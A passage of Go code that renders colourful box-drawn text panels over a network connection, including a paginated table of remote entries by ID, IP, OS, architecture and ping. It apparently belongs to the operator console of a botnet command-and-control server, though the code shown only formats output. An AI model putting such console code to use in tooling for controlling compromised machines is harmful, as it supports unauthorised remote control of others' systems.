	dashLine(c, fmt.Sprintf("   Page %d/%d", page+1, pages))
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")

	start := page * perPage
	end := start + perPage
	if end > len(infos) {
		end = len(infos)
	}
	for _, b := range infos[start:end] {
		id := ellipsis(strings.TrimSpace(b.ID), 16)
		if id == "" {
			id = "?"
		}
		ip := ellipsis(strings.TrimSpace(b.IP), 15)
		if ip == "" {
			ip = "-"
		}
		osf := ellipsis(strings.TrimSpace(b.Sys.OS), 12)
		if osf == "" {
			osf = "?"
		}
		arch := ellipsis(strings.TrimSpace(b.Sys.Arch), 6)
		ping := "-"
		if b.PingMs > 0 {
			ping = fmt.Sprintf("%dms", b.PingMs)
		}
		dashLine(c, fmt.Sprintf("   %-16s %-15s %-12s %-6s %s", id, ip, osf, arch, ping))
	}
	w("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯")
}

func dashLine(c net.Conn, s string) {
	s = ellipsis(s, 78)
	c.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║%-78s║\n\r", s)))
}

func boxMsg(c net.Conn, title, badge string, lines []string) {
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮")
	w(fmt.Sprintf("\x1b[38;5;231m║             § \x1b[38;5;51m%-20s\x1b[38;5;231m §         ║    ┌────────────────────┐    ║", title))
	w(fmt.Sprintf("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │ %-18s │    ║", badge))
	for _, l := range lines {
		if len(l) > 40 {
			l = l[:40]
		}
		w(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m %-40s ║    └────────────────────┘    ║", l))
	}
	w("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯")
}

func ellipsis(s string, max int) string {
	if max <= 0 {
		return ""
	}
	r := []rune(s)
	if len(r) <= max {
		return s
	}
	if max <= 3 {
		return string(r[:max])
	}
	return string(r[:max-3]) + "..."
}
